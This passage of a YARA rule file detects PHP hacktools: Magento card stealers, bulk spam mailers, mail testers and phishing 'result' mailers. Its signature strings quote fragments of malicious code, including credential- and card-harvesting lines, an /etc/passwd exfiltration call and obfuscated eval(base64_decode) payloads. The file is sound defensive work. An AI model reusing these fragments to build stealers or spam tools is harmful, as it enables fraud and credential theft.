        $ps0 = "echo 'Pong';"
    condition:
        $ps0
}

rule php_hacktool_magentoccstealer_001 : hacktool
{
    strings:
        $trigger = "-BEGIN PUBLIC KEY"
    condition:
        $trigger and PR00732 and PR04070 and PR04071
}

private rule PR04072 : trigger
{
    strings:
        $ps0 = "function encrypt("
    condition:
        $ps0
}

rule php_hacktool_magentoccstealer_001_02 : hacktool
{
    strings:
        $trigger = "-BEGIN PUBLIC KEY"
    condition:
        $trigger and PR00732 and PR04070 and PR04072
}

private rule PR04073 : trigger
{
    strings:
        $ps0 = "die(implode('', file($"
    condition:
        $ps0
}

private rule PR04074 : trigger
{
    strings:
        $ps0 = "if (!strpos($_SERVER[\""
    condition:
        $ps0
}

private rule PR04075 : trigger
{
    strings:
        $ps0 = "substr(md5(md5(microtime()) . rand()),"
    condition:
        $ps0
}

private rule PR04076 : trigger
{
    strings:
        $ps0 = "\" . openssl_encrypt(serialize($"
    condition:
        $ps0
}

rule php_hacktool_magentoccstealer_002 : hacktool
{
    strings:
        $trigger = "\"] = @$_SERVER["
    condition:
        $trigger and PR02034 and PR04073 and PR04074 and PR04075 and PR04076
}

private rule PR04077 : trigger
{
    strings:
        $ps0 = "$id_url=\"https://my.mail.ru/\".$id_temp2[0].\"/\".$id_temp[0].\"/\";"
    condition:
        $ps0
}

rule php_hacktool_mail_ru_parser_001 : hacktool
{
    strings:
        $trigger = "base64_decod"
    condition:
        $trigger and PR04077
}

rule php_hacktool_mail_tester_001 : hacktool
{
    strings:
        $trigger = "$headers.='From: ' . $random_name . '@' . $shell_domain"
    condition:
        $trigger
}

private rule PR04078 : trigger
{
    strings:
        $ps0 = "private function check_virginmedia"
    condition:
        $ps0
}

rule php_hacktool_mail_tester_002 : hacktool
{
    strings:
        $trigger = "connect_imap('imap.us.army.mil"
    condition:
        $trigger and PR04078 and PR00301
}

private rule PR04079 : trigger
{
    strings:
        $ps0 = "<title> Email sending tester</title>"
    condition:
        $ps0
}

rule php_hacktool_mail_tester_003 : hacktool
{
    strings:
        $trigger = "mail("
    condition:
        $trigger and PR00092 and PR04079
}

private rule PR04080 : trigger
{
    strings:
        $ps0 = "<form method=\"post\">"
    condition:
        $ps0
}

rule php_hacktool_mail_tester_004 : hacktool
{
    strings:
        $trigger = "mail($_POST['email'],\"Test done by"
    condition:
        $trigger and PR04080
}

rule php_hacktool_mail_tester_005 : hacktool
{
    strings:
        $trigger = "$subject = $_SERVER['SCRIPT_URI']"
    condition:
        $trigger and PR00437 and PR00301
}

private rule PR04081 : trigger
{
    strings:
        $ps0 = "if(mail($recipient, $subject, $message, $headers))"
    condition:
        $ps0
}

rule php_hacktool_mail_tester_006 : hacktool
{
    strings:
        $trigger = "else{return \"BAD!\";}"
    condition:
        $trigger and PR04081
}

private rule PR04082 : trigger
{
    strings:
        $ps0 = "\"/home/\", \"/home1/\", \"/home2/\", \"/home3/\", \"/home4/\","
    condition:
        $ps0
}

rule php_hacktool_mail_tester_007 : hacktool
{
    strings:
        $trigger = "/etc/"
    condition:
        $trigger and PR04082
}

private rule PR04083 : trigger
{
    strings:
        $ps0 = "<title>Mail Test</title>"
    condition:
        $ps0
}

rule php_hacktool_mail_tester_008 : hacktool
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR00355 and PR04083 and PR00357
}

private rule PR04084 : trigger
{
    strings:
        $ps0 = "txt'>MAILLIST by SELLER82</a>"
    condition:
        $ps0
}

rule php_hacktool_mail_tester_009 : hacktool
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR04084 and PR00355 and PR00357
}

rule php_hacktool_mail_tester_010 : hacktool
{
    strings:
        $trigger = "<title>Smart Tools Shop - Email sending tester</title>"
    condition:
        $trigger and PR01330 and PR00046
}

private rule PR04085 : trigger
{
    strings:
        $ps0 = "mail($to, $subject, $"
    condition:
        $ps0
}

rule php_hacktool_mail_tester_011 : hacktool
{
    strings:
        $trigger = "'Reply-To: Nikolaevi4koss@mail.ru' . \"\\r\\n\" ."
    condition:
        $trigger and PR00437 and PR04085
}

rule php_hacktool_mail_tester_012 : hacktool
{
    strings:
        $trigger = ".$_POST['email']."
    condition:
        $trigger and PR03345 and PR00046
}

private rule PR04086 : trigger
{
    strings:
        $ps0 = "------------\\n\";"
    condition:
        $ps0
}

rule php_hacktool_mailerccstealer_001 : hacktool
{
    strings:
        $trigger = ": \".$_POST['credit"
    condition:
        $trigger and PR00279 and PR04086
}

rule php_hacktool_mailerJezzy_001 : hacktool
{
    strings:
        $trigger = "$message .= \"----------------- Spammed By JezzyWire --------------\\n\";"
    condition:
        $trigger
}

rule php_hacktool_mailerJezzy_002 : hacktool
{
    strings:
        $trigger = "$message .= \"---------JEZZY TRADING---------\\n\";"
    condition:
        $trigger
}

rule php_hacktool_mailerJezzy_003 : hacktool
{
    strings:
        $trigger = "$message  = \"---------------+ Alibobo ReZulT +--------------\\n\""
    condition:
        $trigger
}

private rule PR04087 : trigger
{
    strings:
        $ps0 = "<title>Sending M-9AWED"
    condition:
        $ps0
}

rule php_hacktool_mailerM9AWED_001 : hacktool
{
    strings:
        $trigger = "mail("
    condition:
        $trigger and PR04087
}

rule php_hacktool_mailerS3nd3r_001 : hacktool
{
    strings:
        $trigger = "..::S3nd3r MAIL::.."
    condition:
        $trigger and PR00301
}

rule php_hacktool_mailerSp4m3rFb3_001 : hacktool
{
    strings:
        $trigger = " Mailer By Sp4m3r Fb"
    condition:
        $trigger
}

rule php_hacktool_mailertool4spam_001 : hacktool
{
    strings:
        $trigger = "made by http://tool4spam.com "
    condition:
        $trigger and PR00301
}

rule php_hacktool_mailer_001 : hacktool
{
    strings:
        $trigger = "$email = $_POST['otkogo'];"
    condition:
        $trigger and PR00301
}

// MANUAL FIX NECESSARY
rule php_hacktool_mailer_002 : hacktool
{
    strings:
        $trigger = "mail("
        $php_hacktool_mailer_002_r0 = /\$emaillist[\s]*=[\s]*\$_POST\[.emaillist.\];/
    condition:
        $trigger and $php_hacktool_mailer_002_r0
}

private rule PR04088 : trigger
{
    strings:
        $ps0 = "for($x=0; $x<$numemails; $x++){"
    condition:
        $ps0
}

rule php_hacktool_mailer_004 : hacktool
{
    strings:
        $trigger = "mail("
    condition:
        $trigger and PR04088
}

rule php_hacktool_mailer_005 : hacktool
{
    strings:
        $trigger = "if(mail($email[$i], $subject, $me"
    condition:
        $trigger
}

rule php_hacktool_mailer_006 : hacktool
{
    strings:
        $trigger = ">PHP Mailer By"
    condition:
        $trigger
}

private rule PR04089 : trigger
{
    strings:
        $ps0 = "<title>SenderMail"
    condition:
        $ps0
}

rule php_hacktool_mailer_007 : hacktool
{
    strings:
        $trigger = "mail("
    condition:
        $trigger and PR04089
}

rule php_hacktool_mailer_008 : hacktool
{
    strings:
        $trigger = "</TEXTAREA></p><p>Engenharia:<br><TEXTAREA rows=5 cols=100>"
    condition:
        $trigger and PR00301
}

rule php_hacktool_mailer_009 : hacktool
{
    strings:
        $trigger = "$x = unserialize(base64_decode($_POST['task']));"
    condition:
        $trigger and PR00301
}

private rule PR04090 : trigger
{
    strings:
        $ps0 = "<title>:: MAILER ::</title>"
    condition:
        $ps0
}

rule php_hacktool_mailer_010 : hacktool
{
    strings:
        $trigger = "mail("
    condition:
        $trigger and PR04090
}

rule php_hacktool_mailer_011 : hacktool
{
    strings:
        $trigger = "$strr3 = stripslashes($_POST[\"info\"]);"
    condition:
        $trigger and PR00301
}

rule php_hacktool_mailer_012 : hacktool
{
    strings:
        $trigger = "echo('Sent '.$message_in_min.' messages. Pause 60 sec"
    condition:
        $trigger and PR00301
}

rule php_hacktool_mailer_013 : hacktool
{
    strings:
        $trigger = ";class DeleteOnExit {function __destruct(){unlink(__FILE__);}}$g_delete_on_exit = new DeleteOnExit();echo 'good';"
    condition:
        $trigger and PR00301
}

private rule PR04091 : trigger
{
    strings:
        $ps0 = ".= \"Client IP : \""
    condition:
        $ps0
}

rule php_hacktool_mailer_014 : hacktool
{
    strings:
        $trigger = "mail("
    condition:
        $trigger and PR04091
}

rule php_hacktool_mailer_015 : hacktool
{
    strings:
        $trigger = "$urltopost = \"https://id.orange.fr/auth_user2/bin/auth_user.cgi/"
    condition:
        $trigger and PR00301
}

private rule PR04092 : trigger
{
    strings:
        $ps0 = "$message .= \"Pass"
    condition:
        $ps0
}

private rule PR04093 : trigger
{
    strings:
        $ps0 = "getenv("
    condition:
        $ps0
}

rule php_hacktool_mailer_016 : hacktool
{
    strings:
        $trigger = "ocation"
    condition:
        $trigger and PR04092 and PR04093
}

private rule PR04094 : trigger
{
    strings:
        $ps0 = "$message .=\"Pass"
    condition:
        $ps0
}

private rule PR04095 : trigger
{
    strings:
        $ps0 = "getenv"
    condition:
        $ps0
}

rule php_hacktool_mailer_016_02 : hacktool
{
    strings:
        $trigger = "$_POST"
    condition:
        $trigger and PR04094 and PR00301 and PR04095
}

rule php_hacktool_mailer_017 : hacktool
{
    strings:
        $trigger = "$message .= \"password:"
    condition:
        $trigger
}

rule php_hacktool_mailer_018 : hacktool
{
    strings:
        $trigger = "Mail_LoadFromFile('./from_domains.txt', $g_aFromDomains);"
    condition:
        $trigger and PR00279
}

rule php_hacktool_mailer_019 : hacktool
{
    strings:
        $trigger = "$message .= \"---------------Created By YMCMB"
    condition:
        $trigger
}

rule php_hacktool_mailer_020 : hacktool
{
    strings:
        $trigger = "$GUT = mail($empfaenger, $betreff, $nachricht, $header);"
    condition:
        $trigger
}

rule php_hacktool_mailer_021 : hacktool
{
    strings:
        $trigger = ">Bulk Mailer By"
    condition:
        $trigger and PR00301
}

private rule PR04096 : trigger
{
    strings:
        $ps0 = "$data = json_decode(base64_decode(str_replace("
    condition:
        $ps0
}

private rule PR04097 : trigger
{
    strings:
        $ps0 = "$smtp_errors = \"421,422,431,432,"
    condition:
        $ps0
}

rule php_hacktool_mailer_022 : hacktool
{
    strings:
        $trigger = "fsockopen"
    condition:
        $trigger and PR04096 and PR04097
}

rule php_hacktool_mailer_023 : hacktool
{
    strings:
        $trigger = "if(!empty($_GET['ora']) && $_GET['ora']=='test')"
    condition:
        $trigger and PR00301
}

rule php_hacktool_mailer_024 : hacktool
{
    strings:
        $trigger = "$message .= \"--------------+ Aol ReZulT"
    condition:
        $trigger
}

rule php_hacktool_mailer_025 : hacktool
{
    strings:
        $trigger = "$message .= \"-----------------------Deta!ls"
    condition:
        $trigger
}

rule php_hacktool_mailer_026 : hacktool
{
    strings:
        $trigger = "$mail->addAddress('tsegadora@yahoo"
    condition:
        $trigger and PR00301
}

rule php_hacktool_mailer_027 : hacktool
{
    strings:
        $trigger = "$headers = base64_decode($_POST[\"headers\"]);"
    condition:
        $trigger and PR00301
}

rule php_hacktool_mailer_028 : hacktool
{
    strings:
        $trigger = "{echo 'done';} else {echo 'not : '.$"
    condition:
        $trigger and PR00301
}

private rule PR04098 : trigger
{
    strings:
        $ps0 = "$stats = 'done:';"
    condition:
        $ps0
}

rule php_hacktool_mailer_029 : hacktool
{
    strings:
        $trigger = "$subj"
    condition:
        $trigger and PR04098
}

rule php_hacktool_mailer_030 : hacktool
{
    strings:
        $trigger = "$sent = \"xxx\".\"sent!\";"
    condition:
        $trigger and PR00279
}

private rule PR04099 : trigger
{
    strings:
        $ps0 = "if ($_POST[\"enviar\"]){"
    condition:
        $ps0
}

rule php_hacktool_mailer_031 : hacktool
{
    strings:
        $trigger = "Mailer"
    condition:
        $trigger and PR04099
}

private rule PR04100 : trigger
{
    strings:
        $ps0 = "$subject = $_POST[\"subject\"];"
    condition:
        $ps0
}

private rule PR04101 : trigger
{
    strings:
        $ps0 = "$post = array("
    condition:
        $ps0
}

rule php_hacktool_mailer_032 : hacktool
{
    strings:
        $trigger = "curl_setopt($ch, CURLOPT_POSTFIELDS, $post);"
    condition:
        $trigger and PR04100 and PR04101
}

rule php_hacktool_mailer_033 : hacktool
{
    strings:
        $trigger = "<textarea name=\"letter\" placeholder=\"Here The Letter\" rows"
    condition:
        $trigger and PR00039
}

rule php_hacktool_mailer_034 : hacktool
{
    strings:
        $trigger = "$message .= 'Exp M: ';"
    condition:
        $trigger
}

rule php_hacktool_mailer_035 : hacktool
{
    strings:
        $trigger = "$reply .= \"< 354 OK.\";"
    condition:
        $trigger and PR00301
}

private rule PR04102 : trigger
{
    strings:
        $ps0 = "----> wait \".$_GET['time'].\" Segs. Sending to \"."
    condition:
        $ps0
}

rule php_hacktool_mailer_036 : hacktool
{
    strings:
        $trigger = "mail("
    condition:
        $trigger and PR04102
}

rule php_hacktool_mailer_037 : hacktool
{
    strings:
        $trigger = "$message .= \"************* Fuck"
    condition:
        $trigger
}

rule php_hacktool_mailer_038 : hacktool
{
    strings:
        $trigger = "echo \"<script>window.alert(\\\"$numemails_a emails sent!\\\"); history.back(-1);"
    condition:
        $trigger and PR00437 and PR00301
}

private rule PR04103 : trigger
{
    strings:
        $ps0 = "Mailer"
    condition:
        $ps0
}

rule php_hacktool_mailer_039 : hacktool
{
    strings:
        $trigger = "$fromadr = base64_decode($_POST['fromadr']);"
    condition:
        $trigger and PR04103
}

private rule PR04104 : trigger
{
    strings:
        $ps0 = "foreach($mails as $mail)"
    condition:
        $ps0
}

rule php_hacktool_mailer_040 : hacktool
{
    strings:
        $trigger = "echo \"<b>\".$count.\" Mail(s) sent</b><br><br>\";"
    condition:
        $trigger and PR04104 and PR00301
}

rule php_hacktool_mailer_041 : hacktool
{
    strings:
        $trigger = "echo \"Mail:\".mails().',Etc:'.base64_encode(etcpasswd());"
    condition:
        $trigger and PR00301
}

private rule PR04105 : trigger
{
    strings:
        $ps0 = "<$email_polucha>\" . $end_zag;"
    condition:
        $ps0
}

rule php_hacktool_mailer_042 : hacktool
{
    strings:
        $trigger = "function smtpmail($host, $port, $smtp_login"
    condition:
        $trigger and PR00437 and PR04105
}

rule php_hacktool_mailer_043 : hacktool
{
    strings:
        $trigger = "<title>LaymenoS"
    condition:
        $trigger and PR00301
}

rule php_hacktool_mailer_044 : hacktool
{
    strings:
        $trigger = "<title>Smart Mailer"
    condition:
        $trigger and PR00301
}

rule php_hacktool_mailer_045 : hacktool
{
    strings:
        $trigger = "<title>.: Wahib Mkadmi Priv8"
    condition:
        $trigger and PR00301
}

rule php_hacktool_mailer_046 : hacktool
{
    strings:
        $trigger = "echo (\": inb0x : $domain !\");"
    condition:
        $trigger and PR00437 and PR00301
}

private rule PR04106 : trigger
{
    strings:
        $ps0 = "$TEXT = $_POST["
    condition:
        $ps0
}

private rule PR04107 : trigger
{
    strings:
        $ps0 = "$mailSMTP = new SendMailSmtpClass($LOGIN, $PASSWORD, $SERVER, $NAME, $PORT);"
    condition:
        $ps0
}

rule php_hacktool_mailer_047 : hacktool
{
    strings:
        $trigger = "echo \"[good:\".$resA[$a].\"]\";"
    condition:
        $trigger and PR00279 and PR04106 and PR04107
}

private rule PR04108 : trigger
{
    strings:
        $ps0 = "-----"
    condition:
        $ps0
}

rule php_hacktool_mailer_048 : hacktool
{
    strings:
        $trigger = "$sad=md5($ema[$i]);"
    condition:
        $trigger and PR00301 and PR04108
}

rule php_hacktool_mailer_049 : hacktool
{
    strings:
        $trigger = "\"Important Information - \".$xx,\"WORKING !\");"
    condition:
        $trigger and PR00301
}

rule php_hacktool_mailer_050 : hacktool
{
    strings:
        $trigger = "if(mail($TO, \"\".$subject.\"\".$dataHora.$x1.$email[$i], $message, $headers"
    condition:
        $trigger
}

rule php_hacktool_mailer_051 : hacktool
{
    strings:
        $trigger = "$message .= \"---------------|BY NoBODY|"
    condition:
        $trigger
}

private rule PR04109 : trigger
{
    strings:
        $ps0 = "BlackSHOP</title>"
    condition:
        $ps0
}

rule php_hacktool_mailer_052 : hacktool
{
    strings:
        $trigger = "($_POST)"
    condition:
        $trigger and PR04109 and PR02033
}

rule php_hacktool_mailer_053 : hacktool
{
    strings:
        $trigger = "alexusMailer"
    condition:
        $trigger and PR00437 and PR00301 and PR01123
}

rule php_hacktool_mailer_054 : hacktool
{
    strings:
        $trigger = "eval(base64_decode('aWdub3JlX3VzZXJfYW"
    condition:
        $trigger
}

private rule PR04110 : trigger
{
    strings:
        $ps0 = "mail($Destination, $Subject8, \"\", $header);"
    condition:
        $ps0
}

private rule PR04111 : trigger
{
    strings:
        $ps0 = "if ($ac==\"go\"){"
    condition:
        $ps0
}

rule php_hacktool_mailer_055 : hacktool
{
    strings:
        $trigger = "$_POST"
    condition:
        $trigger and PR04110 and PR04111
}

private rule PR04112 : trigger
{
    strings:
        $ps0 = "<title>hecker\\'s spamer v"
    condition:
        $ps0
}

rule php_hacktool_mailer_056 : hacktool
{
    strings:
        $trigger = "$_POST"
    condition:
        $trigger and PR00437 and PR00301 and PR04112
}

rule php_hacktool_mailer_057 : hacktool
{
    strings:
        $trigger = "<title>@Mailer"
    condition:
        $trigger and PR00437 and PR00301 and PR01123
}

rule php_hacktool_mailer_058 : hacktool
{
    strings:
        $trigger = "public function exec($url, $code, $data, $password, $login)"
    condition:
        $trigger and PR00013
}

rule php_hacktool_mailer_059 : hacktool
{
    strings:
        $trigger = "echo \"uploadezeez <br>\";"
    condition:
        $trigger and PR00301
}

rule php_hacktool_mailer_060 : hacktool
{
    strings:
        $trigger = "Spyus ANH Mailer"
    condition:
        $trigger and PR00301 and PR00373
}

private rule PR04113 : trigger
{
    strings:
        $ps0 = "die(PHP_OS.$"
    condition:
        $ps0
}

private rule PR04114 : trigger
{
    strings:
        $ps0 = "STREAM_CRYPTO_METHOD_TLS_CLIENT"
    condition:
        $ps0
}

rule php_hacktool_mailer_061 : hacktool
{
    strings:
        $trigger = "@$GLOBALS["
    condition:
        $trigger and PR04113 and PR04114 and PR01016
}

rule php_hacktool_mailer_062 : hacktool
{
    strings:
        $trigger = "<title>Sender Anony"
    condition:
        $trigger and PR00301
}

private rule PR04115 : trigger
{
    strings:
        $ps0 = "else{echo \"$email : NON :(\";}"
    condition:
        $ps0
}

rule php_hacktool_mailer_063 : hacktool
{
    strings:
        $trigger = "mail("
    condition:
        $trigger and PR04115
}

private rule PR04116 : trigger
{
    strings:
        $ps0 = "$from_email = \"$name<$SendEmail>\";"
    condition:
        $ps0
}

rule php_hacktool_mailer_064 : hacktool
{
    strings:
        $trigger = " = file_get_contents('http:"
    condition:
        $trigger and PR04116 and PR00301
}

rule php_hacktool_mailer_065 : hacktool
{
    strings:
        $trigger = "<p>PHP MAILER INBOX"
    condition:
        $trigger and PR00437 and PR00301
}

rule php_hacktool_mailer_066 : hacktool
{
    strings:
        $trigger = "<? if($_POST['Send']) { ?>"
    condition:
        $trigger and PR00437 and PR00301
}

private rule PR04117 : trigger
{
    strings:
        $ps0 = "[SilentAngel]"
    condition:
        $ps0
}

rule php_hacktool_mailer_067 : hacktool
{
    strings:
        $trigger = "-----"
    condition:
        $trigger and PR04117 and PR00301
}

private rule PR04118 : trigger
{
    strings:
        $ps0 = "='----------'.strtoupper(dechex(rand("
    condition:
        $ps0
}

rule php_hacktool_mailer_068 : hacktool
{
    strings:
        $trigger = "mail("
    condition:
        $trigger and PR04118
}

rule php_hacktool_mailer_069 : hacktool
{
    strings:
        $trigger = "('I3hnd3d5DQpAZXJyb3JfcmVwb3J0aW5nKDApOyNnd"
    condition:
        $trigger and PR00029
}

rule php_hacktool_mailer_071 : hacktool
{
    strings:
        $trigger = "<title>Outbox priv8 version"
    condition:
        $trigger
}

rule php_hacktool_mailer_072 : hacktool
{
    strings:
        $trigger = "Result Report Test - \".$xx,\"WORKING !\");"
    condition:
        $trigger and PR00301
}

private rule PR04119 : trigger
{
    strings:
        $ps0 = "404 error"
    condition:
        $ps0
}

rule php_hacktool_mailer_074 : hacktool
{
    strings:
        $trigger = "if(isset($_POST[\"to_address\"]))"
    condition:
        $trigger and PR02681 and PR04119
}

private rule PR04120 : trigger
{
    strings:
        $ps0 = "<title> .:| PHPMailer |::."
    condition:
        $ps0
}

rule php_hacktool_mailer_075 : hacktool
{
    strings:
        $trigger = "mail("
    condition:
        $trigger and PR04120
}

rule php_hacktool_mailer_076 : hacktool
{
    strings:
        $trigger = "<title>Fakemailer PRO"
    condition:
        $trigger and PR00301
}

rule php_hacktool_mailer_077 : hacktool
{
    strings:
        $trigger = "PSBtYWlsKHN0cmlwc2xhc2hlcygk"
    condition:
        $trigger and PR00029 and PR01422
}

private rule PR04121 : trigger
{
    strings:
        $ps0 = "JGl4aHBxID0gc3RyaXBzbGFzaGVzKGJhc2U2NF9kZWNvZGUoJF9QT1"
    condition:
        $ps0
}

rule php_hacktool_mailer_078 : hacktool
{
    strings:
        $trigger = "base64_decode"
    condition:
        $trigger and PR04121 and PR00029
}

private rule PR04122 : trigger
{
    strings:
        $ps0 = "YWRlciA9ICJGcm9tOiAkZnJvbV9zaGVsbGNvZGV"
    condition:
        $ps0
}

rule php_hacktool_mailer_079 : hacktool
{
    strings:
        $trigger = "base64_decode"
    condition:
        $trigger and PR00029 and PR04122
}

private rule PR04123 : trigger
{
    strings:
        $ps0 = "$IP = pack(\"H*\", substr(strpos($COOKIE_VARS,"
    condition:
        $ps0
}

rule php_hacktool_mailer_080 : hacktool
{
    strings:
        $trigger = "mail("
    condition:
        $trigger and PR04123 and PR00437
}

private rule PR04124 : trigger
{
    strings:
        $ps0 = "base64_decode("
    condition:
        $ps0
}

rule php_hacktool_mailer_081 : hacktool
{
    strings:
        $trigger = "{echo 'not found';}"
    condition:
        $trigger and PR02681 and PR04124
}

rule php_hacktool_mailer_082 : hacktool
{
    strings:
        $trigger = "<title>.: Dr Spam"
    condition:
        $trigger and PR00301
}

rule php_hacktool_mailer_083 : hacktool
{
    strings:
        $trigger = "<title>paranoyou test mail"
    condition:
        $trigger and PR00301
}

private rule PR04125 : trigger
{
    strings:
        $ps0 = "IVNNYWlsKHRyaW0oJGV4WyRjXSks"
    condition:
        $ps0
}

rule php_hacktool_mailer_084 : hacktool
{
    strings:
        $trigger = "='b"
    condition:
        $trigger and PR01410 and PR04125 and PR01411
}

rule php_hacktool_mailer_085 : hacktool
{
    strings:
        $trigger = "'X-Mailer: PHP/' . \\x70\\x68\\x70\\x76\\x65\\x72\\x73\\x69\\x6F\\x6E(); \\$"
    condition:
        $trigger and PR00029
}

private rule PR04126 : trigger
{
    strings:
        $ps0 = "dXJsZGVjb2RlKCRfUE9TV"
    condition:
        $ps0
}

rule php_hacktool_mailer_086 : hacktool
{
    strings:
        $trigger = "='b"
    condition:
        $trigger and PR01410 and PR04126 and PR01411
}

private rule PR04127 : trigger
{
    strings:
        $ps0 = "$USE_HOTMAIL_INBOX_METHOD = false; # true/false"
    condition:
        $ps0
}

rule php_hacktool_mailer_087 : hacktool
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR04127
}

rule php_hacktool_mailer_088 : hacktool
{
    strings:
        $trigger = "<title>CaZaNoVa"
    condition:
        $trigger
}

private rule PR04128 : trigger
{
    strings:
        $ps0 = "$multipart .= chunk_split(base64_encode($html));"
    condition:
        $ps0
}

rule php_hacktool_mailer_089 : hacktool
{
    strings:
        $trigger = "passw"
    condition:
        $trigger and PR04128 and PR00301
}

private rule PR04129 : trigger
{
    strings:
        $ps0 = ".$name.' <'.$emailTo.'>"
    condition:
        $ps0
}

rule php_hacktool_mailer_090 : hacktool
{
    strings:
        $trigger = "header(\"Location:"
    condition:
        $trigger and PR04129 and PR00301
}

rule php_hacktool_mailer_091 : hacktool
{
    strings:
        $trigger = "echo eval(base64_decode(''));"
    condition:
        $trigger and PR01788
}

private rule PR04130 : trigger
{
    strings:
        $ps0 = "<title>Spammer's Mail"
    condition:
        $ps0
}

rule php_hacktool_mailer_092 : hacktool
{
    strings:
        $trigger = "mail("
    condition:
        $trigger and PR04130
}

private rule PR04131 : trigger
{
    strings:
        $ps0 = "<input type=\"text\" name=\"email\" value="
    condition:
        $ps0
}

rule php_hacktool_mailer_093 : hacktool
{
    strings:
        $trigger = "if (!empty($_GET['email'])){"
    condition:
        $trigger and PR04131 and PR00301
}

private rule PR04132 : trigger
{
    strings:
        $ps0 = "if (!empty($_POST['email'])){"
    condition:
        $ps0
}

rule php_hacktool_mailer_093_02 : hacktool
{
    strings:
        $trigger = "mail("
    condition:
        $trigger and PR04131 and PR04132
}

rule php_hacktool_mailer_094 : hacktool
{
    strings:
        $trigger = "<\\?php[\\s]*$tranta = mail(stripslashes($_POST['cliento']), stripslashes($_POST['ticketvar"
    condition:
        $trigger
}

rule php_hacktool_mailer_095 : hacktool
{
    strings:
        $trigger = "$entry_line = \"$ip | UA: $agent | \\r\\n\";"
    condition:
        $trigger and PR00279
}

rule php_hacktool_mailer_096 : hacktool
{
    strings:
        $trigger = "mail($name,$email_subject,$email_message,$headers);sleep (1);print"
    condition:
        $trigger
}

rule php_hacktool_mailer_097 : hacktool
{
    strings:
        $trigger = "<a href=\"http://www.dangerousmailer.com"
    condition:
        $trigger and PR00732
}

// MANUAL FIX NECESSARY
rule php_hacktool_mailer_098 : hacktool
{
    strings:
        $trigger = "<title>"
        $php_hacktool_mailer_098_w0 = "<title>FormMail v"
        $php_hacktool_mailer_098_r1 = /<title>\S+[Mm][Aa][Ii][Ll]([Ee][Rr])?\s*v\d+(\.\d+)?\s*<\/title>/
    condition:
        $trigger and PR00301 and not $php_hacktool_mailer_098_w0 and $php_hacktool_mailer_098_r1
}

private rule PR04133 : trigger
{
    strings:
        $ps0 = ": ' . $"
    condition:
        $ps0
}

private rule PR04134 : trigger
{
    strings:
        $ps0 = ";} else {echo '"
    condition:
        $ps0
}

rule php_hacktool_mailer_099 : hacktool
{
    strings:
        $trigger = "= mail($"
    condition:
        $trigger and PR04133 and PR00507 and PR04134
}

private rule PR04135 : trigger
{
    strings:
        $ps0 = "if(isset($_GET['del']))"
    condition:
        $ps0
}

rule php_hacktool_mailer_100 : hacktool
{
    strings:
        $trigger = "$rand=rand(999,99999);"
    condition:
        $trigger and PR00265 and PR04135
}

private rule PR04136 : trigger
{
    strings:
        $ps0 = "$_ = \" -u : http://\" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'] . \" \"; $_ .= \" -p : \" . __file__; $"
    condition:
        $ps0
}

rule php_hacktool_mailer_101 : hacktool
{
    strings:
        $trigger = "$_POST"
    condition:
        $trigger and PR04136 and PR00397
}

private rule PR04137 : trigger
{
    strings:
        $ps0 = "by xIgOr"
    condition:
        $ps0
}

rule php_hacktool_mailer_102 : hacktool
{
    strings:
        $trigger = "header(\"Location:"
    condition:
        $trigger and PR04137
}

private rule PR04138 : trigger
{
    strings:
        $ps0 = "/_/\\_\\_|   \\__,_|_| |_| |_|"
    condition:
        $ps0
}

rule php_hacktool_mailer_102_02 : hacktool
{
    strings:
        $trigger = "mail("
    condition:
        $trigger and PR04138
}

private rule PR04139 : trigger
{
    strings:
        $ps0 = "$msgrand = str_replace(\"%rand%\", $num1, $mensagem[$msg]);"
    condition:
        $ps0
}

private rule PR04140 : trigger
{
    strings:
        $ps0 = "= mail($"
    condition:
        $ps0
}

rule php_hacktool_mailer_103 : hacktool
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR04139 and PR00507 and PR04140
}

// MANUAL FIX NECESSARY
rule php_hacktool_mailer_104 : hacktool
{
    strings:
        $trigger = "imap_mail($"
        $php_hacktool_mailer_104_r0 = /\$[\w]+[\s]*=[\s]*base64_decode\(\$_POST\[.[\w]+.\]\);[\s]*\$[\w]+[\s]*=[\s]*imap_mail\(\$[\w]+,[\s]*\$[\w]+[^;]+\);[^>]+if[\s]*\(\$[\w]+\)[\s]*\{[\s]*echo[\s]*.[\w]+.;/
    condition:
        $trigger and PR01351 and $php_hacktool_mailer_104_r0
}

private rule PR04141 : trigger
{
    strings:
        $ps0 = "echo \"<br>$n - Sending... => $taz => <b> <font color=green> Success</font></b>\";"
    condition:
        $ps0
}

rule php_hacktool_mailer_105 : hacktool
{
    strings:
        $trigger = "$_POST"
    condition:
        $trigger and PR04141 and PR00397
}

private rule PR04142 : trigger
{
    strings:
        $ps0 = "function crossEcho($string)"
    condition:
        $ps0
}

private rule PR04143 : trigger
{
    strings:
        $ps0 = "static function write_config_file"
    condition:
        $ps0
}

rule php_hacktool_mailer_106 : hacktool
{
    strings:
        $trigger = "exit;"
    condition:
        $trigger and PR00039 and PR02056 and PR04142 and PR04143
}

private rule PR04144 : trigger
{
    strings:
        $ps0 = "message' => 'Sukses'"
    condition:
        $ps0
}

rule php_hacktool_mailer_107 : hacktool
{
    strings:
        $trigger = "mail($_POST['to'], $_POST['subject'], base64_decode($_POST['letter"
    condition:
        $trigger and PR00437 and PR04144
}

private rule PR04145 : trigger
{
    strings:
        $ps0 = "Anonymous Email Mail Sender"
    condition:
        $ps0
}

rule php_hacktool_mailer_108 : hacktool
{
    strings:
        $trigger = "$_POST"
    condition:
        $trigger and PR04145
}

private rule PR04146 : trigger
{
    strings:
        $ps0 = "Pz48P3BocA0KLy9Ca3NtNGw1ICoqKFIyMlRUTikqKg0KczV0X3"
    condition:
        $ps0
}

rule php_hacktool_mailer_109 : hacktool
{
    strings:
        $trigger = "$_F=__FILE__;$_X='Pz48P3BocA0K"
    condition:
        $trigger and PR04146 and PR01479
}

private rule PR04147 : trigger
{
    strings:
        $ps0 = "BY RFX"
    condition:
        $ps0
}

private rule PR04148 : trigger
{
    strings:
        $ps0 = "@mail(\"XXXX\",\"MAILIST\",$emaillist,\"From: X <XXX>\");"
    condition:
        $ps0
}

rule php_hacktool_mailer_110 : hacktool
{
    strings:
        $trigger = "extract"
    condition:
        $trigger and PR02034 and PR04147 and PR04148
}

private rule PR04149 : trigger
{
    strings:
        $ps0 = "rand("
    condition:
        $ps0
}

private rule PR04150 : trigger
{
    strings:
        $ps0 = "getenv(\"REMOTE_ADDR\");"
    condition:
        $ps0
}

private rule PR04151 : trigger
{
    strings:
